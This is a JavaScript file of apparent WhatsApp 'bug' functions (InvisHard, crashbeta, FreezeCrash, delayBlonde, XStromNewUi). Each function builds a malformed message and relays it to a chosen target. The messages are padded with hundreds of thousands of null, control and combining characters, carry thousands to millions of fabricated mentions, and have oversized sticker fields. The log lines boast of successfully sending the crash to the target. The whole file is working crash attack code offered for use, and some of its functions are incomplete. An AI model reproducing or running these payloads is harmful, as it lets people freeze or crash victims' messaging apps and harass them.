async function InvisHard(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "INVISHARDER",
                    footerText: "InvisibleHard༑",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await sock.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "InvisHarder" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
        async function crashbeta(target, ptcp = false) {
let BetaFc = "KekuatanBatangHitam" + "ꦾ".repeat(250000);

const messageContent = {
    ephemeralMessage: {
        message: {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 0,
                        caption: BetaFc,
                        sequenceNumber: "",
                        jpegThumbnail: null
                    },
                    body: {
                        text: BetaFc
                    },
                    nativeFlowMessage: {}, // If needed, specify more details here
                    contextInfo: {
                     contactVcard: true,
                        mentionedJid: [m.chat],
                        groupMentions: [
                            { 
                                groupJid: "@120363321780343299@g.us", 
                                groupSubject: "mengjawa" 
                            }
                        ]
                    }
                }
            }
        }
    }
}
}
async function FreezeCrash(target) {
  try {
    let msg1 = {
      viewOnceMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "120363321780343299@newsletter",
            newsletterName: "𝐏𝐎𝐒𝐄𝐈𝐃𝐎𝐍 • 𝐗-𝐂𝐎𝐑𝐄" + "ꦾ࣯࣯".repeat(10000),
            caption: "𝐏𝐎𝐒𝐄𝐈𝐃𝐎𝐍 :: 𝐌𝐄𝐒𝐒𝐀𝐆𝐄" + "ꦾ࣯࣯".repeat(10000),
            inviteExpiration: 999999999
          },
        },
      },
    };
    
    await sock.relayMessage(target, msg1, {
      messageId: null,
      participant: { jid: target }
    });
    console.log(chalk.bold.red(`[+]: PROSES SENDING`));

    const msgContent2 = {
      viewOnceMessage: {
        message: {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "𝐏𝐎𝐒𝐄𝐈𝐃𝐎𝐍 • 𝐗-𝐂𝐎𝐑𝐄" + "\u202E".repeat(500) + "\uDBFF\uDFFF".repeat(1000),
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 992.999999,
                    degreesLongitude: -932.8889989,
                    name: "\u900A" + "\u0000".repeat(5000) + "\uFFFF".repeat(2000),
                    address: "\u0007".repeat(20000) + "꧔꧈".repeat(5000) + "\u2060".repeat(1000),
                  },
                },
                body: {
                  text: " 𝐏𝐎𝐒𝐄𝐈𝐃𝐎𝐍 :: 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 " + "\u0003".repeat(10000) + "꧔꧈".repeat(2000)
                },
                contextInfo: {
                  remoteJid: target,
                  participant: "0@s.whatsapp.net",
                  stanzaId: "1234567890ABCDEF",
                  forwardingScore: 99999,
                  isForwarded: true,
                  businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                  },
                  mentionedJid: [
                    target,
                    "1@s.whatsapp.net",
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1997 }, () =>
                      `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
                    )
                  ]
                }
              }
            }
          }
        }
      }
    };

    const msg2 = generateWAMessageFromContent(target, msgContent2, { userJid: target });

    await sock.relayMessage(target, msg2.message, { messageId: msg2.key.id });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });

    console.log(chalk.bold.green(`[+]: SUKSES SENDING`));

  } catch (err) {
    console.error(err);
  }
}
async function delayBlonde(target, ptcp) {
  let msg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "./StickerBug.png"
        }, 
        contextInfo: {
          isForwarded: true, 
          forwardingScore: 250208,
          participant: "13135550001@s.whatsapp.net", 
          remoteJid: "status@broadcast", 
          mentionJid: [target, "13135550002@s.whatsapp.net", ...Array.from({ length:25022008 }, () => `2502${Math.floor(Math.random() * 250208)}2008@s.whatsapp.net`)], 
          isGroupMention: true, 
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 2,
              expiryTimestamp: Date.now()
            }
          }
        }
      }
    }
  };
  
  await Yuukey.relayMessage(target, msg, ptcp ? { participant: { jid:target }} : {});
}
async function XStromNewUi(target) {
  try {
   const msg = {
     viewOnceMessage: {
       message: {
         interactiveMessage: {
           contextInfo: {
             participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                ...Array.from(
               { length: 1900 },
               () =>
             "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
           paymentInviteMessage: {
             serviceType: 3,
             expiryTimestamp: Date.now() + 1814400000
               },
             },
             externalAdReply: {
               title: "☀️",
               body: "🩸",
               mediaType: 1,
             renderLargerThumbnail: false,
             },
           },
           body: {
             text: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
           },
           nativeFlowMessage: {
             messageParamJson: "{".repeat(25000),
           },
           stickerMessage: {
             url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
             fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
             fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
             mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
             mimetype: "image/webp",
             height: 9999,
             width: 9999,
             directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
             fileLength: 12260,
             mediaKeyTimestamp: "1743832131",
             isAnimated: false,
             stickerSentTs: "X",
             isAvatar: false,
             isAiSticker: false,
             isLottie: false,
           },
         },
       },
     },
   };
   
   await sock.relayMessage(target, msg, {
     messageId: null,
     participant: { jid: target },
   });
   console.log(chalk.bold.blue(`Succes Sending Bug NewUi By XStrom-Flower To ${target}`));
 } catch (err) {
   console.log("GAGAL MENGIRIM BUG STICKER", err);
   throw err;
  }
}